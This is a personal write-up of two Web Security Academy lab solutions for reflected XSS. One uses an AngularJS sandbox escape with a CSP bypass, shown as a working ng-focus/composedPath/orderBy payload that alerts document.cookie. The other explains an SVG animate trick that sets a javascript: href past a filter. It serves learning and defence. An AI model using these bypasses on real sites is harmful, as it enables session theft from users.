Topic: Cross-Site Scripting (Sandbox Escape + CSP Bypass) | Difficulty: Expert

## Vulnerability
This lab combines two independent, hardened defenses: AngularJS's
expression sandbox (as in Labs 11 and 25) AND a Content Security Policy
(CSP) — an HTTP header-based browser defense that restricts what scripts
are allowed to run and where they can come from, specifically designed to
make XSS exploitation much harder even if an injection point exists.

## What is CSP and Why It Matters Here
A Content Security Policy tells the browser exactly which script sources,
inline scripts, and event handlers are permitted to execute on a page. A
well-configured CSP can block traditional payloads (`<script>` tags,
`onerror`/`onclick` attributes) outright, even if the underlying injection
point is completely unfiltered — this is why CSP is considered one of the
strongest modern browser-level XSS mitigations. Bypassing it requires
finding an execution path the policy doesn't account for.

## Steps Taken

### Step 1: Build the exploit
On the exploit server, used a redirect script to send the victim to the
vulnerable page with an embedded payload:
```html

location='https://YOUR-LAB-ID.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';

```

### Step 2: Deliver to victim
Clicked "Store" and "Deliver exploit to victim."

## How the Payload Works

### Bypassing CSP using ng-focus
Rather than using a blocked construct like `<script>` or a typical event
handler attribute, the payload uses AngularJS's own `ng-focus` directive —
this is processed by AngularJS itself (already trusted and loaded on the
page), not treated by the browser as a new inline script, allowing it to
execute even under a strict CSP that would otherwise block raw
`onfocus="..."` attributes.

### Triggering focus automatically
Same technique as Lab 15 (custom tag lab): appending `#x` to the URL
causes the browser to automatically scroll to and focus the element with
`id="x"` on page load — triggering the `ng-focus` handler with zero victim
interaction required.

### Accessing the window object without referencing it directly
- `$event` is AngularJS's reference to the actual browser event object
  generated when focus occurs
- `.composedPath()` (Chrome-specific, called `path` historically) returns
  an array of every DOM element the event passed through, in order — the
  very last element in this array is always the `window` object itself
- AngularJS's sandbox normally blocks any expression that tries to
  reference `window` directly (a core part of its security checks) — but
  by reaching `window` indirectly, through an array returned by a
  legitimate event property, the sandbox's direct-reference check is never
  triggered at all

### Using orderBy to reach window and execute code in its scope
- `|orderBy:'(z=alert)(document.cookie)'` pipes the `composedPath()`
  array into AngularJS's `orderBy` filter, with a custom sorting
  expression as its argument
- `orderBy` evaluates its sorting expression against *each* element in the
  array being sorted — including, eventually, the `window` object itself
  (the last element in the path array)
- `(z=alert)` assigns the real `alert` function to a new variable `z`
  *inside* the scope of whichever object is currently being evaluated —
  when this happens to be the `window` object, `z` effectively becomes a
  reference to `window.alert`
- `(document.cookie)` immediately calls that newly assigned function,
  passing `document.cookie` as its argument — resulting in
  `alert(document.cookie)` executing, without ever writing the word
  `window` in the payload at all

## Result
Successfully bypassed both the Content Security Policy and the AngularJS
sandbox simultaneously, executing `alert(document.cookie)` by exploiting
`ng-focus`, the `composedPath()` event property, and the `orderBy` filter
together — solving the lab.

## What I Learned
This lab represented the combination of nearly every advanced concept
covered across the XSS topic: using a framework's own trusted directives
(`ng-focus`) to bypass CSP restrictions on inline event handlers, using
legitimate browser/event APIs (`composedPath()`) to indirectly reach a
normally-blocked object (`window`) without ever referencing it by name,
and chaining that through AngularJS's `orderBy` filter to execute
arbitrary code in the correct scope. This reflects genuinely advanced,
real-world browser security research — CSP and framework sandboxes are
each independently considered strong defenses, and combining bypasses for
both in a single working exploit demonstrates a level of depth well beyond
typical "find an unescaped input" XSS. This lab, more than any other in
this topic, would be a strong centerpiece to discuss in a technical
interview, as it shows genuine understanding of browser internals and
defense mechanisms rather than just payload memorization.



## Lab 27: Reflected XSS with Event Handlers and href Attributes Blocked

Topic: Cross-Site Scripting (Filter Bypass) | Difficulty: Expert

## Vulnerability
This application whitelists certain tags, but strictly blocks any event
handler attributes (`onclick`, `onerror`, `onfocus`, etc.) AND blocks
direct `href` attributes on anchor tags. This closes off both the
event-handler technique (used throughout Labs 3, 4, 7, 10, 13, etc.) and
the direct `javascript:` URI technique (used in Labs 5 and 8) at the same
time.

## Steps Taken

### Step 1: Build the payload
```html
Click me
```

### Step 2: Deliver via URL
Visited the crafted URL containing this payload, with a "Click me" label
as required for the simulated victim to interact with it.

## How the Payload Works
- `<svg><a>...</a></svg>` creates an anchor element inside an SVG
  container — SVG anchors behave similarly to regular HTML anchors but
  exist in a slightly different part of the browser's rendering engine,
  which affects which attributes are actively filtered
- `<animate attributeName=href values=javascript:alert(1) />` is an SVG
  **animation** element, not a static attribute assignment — instead of
  writing `href="javascript:alert(1)"` directly (which would be blocked,
  since the filter blocks direct `href` attributes), this uses SVG's
  built-in animation system to *dynamically set* the `href` attribute's
  value over time, entirely sidestepping the filter that only inspects
  static/literal attribute assignments
- `attributeName=href` tells the animation which attribute to target
  (`href`), and `values=javascript:alert(1)` specifies what value to
  animate it to
- `<text x=20 y=20>Click me</text>` provides the clickable, visible label
  text required for this SVG anchor to function as a clickable link
- Once the animation applies the `javascript:alert(1)` value to the
  anchor's `href`, clicking the link executes it exactly like the
  `javascript:` URI technique from Labs 5 and 8

## Result
Successfully used an SVG `<animate>` element to dynamically inject a
`javascript:` URI into an anchor's `href` attribute — bypassing both the
event-handler blocklist and the direct-href blocklist simultaneously —
and triggered `alert(1)` when the link was clicked, solving the lab.

## What I Learned
This lab reinforced a theme first seen in Lab 16 (SVG markup bypass):
SVG's animation elements (`<animate>`, `<animatetransform>`, etc.) can be
used to *dynamically set* attribute values that a filter only checks
statically — meaning a filter that correctly blocks `href="javascript:..."`
as a literal string can still be completely bypassed if the same value is
instead assigned through an animation, since the filter never inspects
values applied dynamically at render time. This is a genuinely subtle
and non-obvious bypass technique, and reinforces why blocklist-style
filters covering only "known dangerous attribute assignments" are
fundamentally incomplete — SVG's animation system provides an entirely
separate mechanism for setting practically any attribute to any value,
outside the scope of typical attribute-level filtering.
